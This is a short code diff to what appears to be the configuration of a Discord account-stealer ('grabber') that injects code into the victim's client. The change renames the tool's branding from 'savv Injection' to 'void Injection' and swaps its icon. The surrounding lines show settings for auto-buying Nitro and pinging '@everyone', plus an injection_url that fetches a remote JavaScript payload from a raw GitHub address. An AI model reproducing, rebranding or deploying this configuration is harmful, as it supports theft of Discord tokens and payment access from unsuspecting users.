@@ -11,8 +11,8 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'savv Injection', 
-  embed_icon: 'https://media.discordapp.net/attachments/1351435538837540888/1351674049104842762/savv_Grabber.png?ex=67db3c0e&is=67d9ea8e&hm=54f45aaf45324fcb6aeed73192e8a0f681d02a30929423461f19b5bc2d32577e&=&format=webp&quality=lossless'.replace(/ /g, '%20'),
+  embed_name: 'void Injection', 
+  embed_icon: 'https://cdn.discordapp.com/attachments/1351697032091271232/1355355252026638346/119efd7cc9c945851967fd81f1578869.png?ex=67e8a071&is=67e74ef1&hm=cf4525e1f2d3e611e6fc0fc0490e0032c3d62e0fbfada9db986e8b00659b1d21&'.replace(/ /g, '%20'),
   embed_color: 15548997, 
   injection_url: 'https://raw.githubusercontent.com/u8i9vnyhngvjyfvyjf6uy/539835689456/main/good.js', 
 
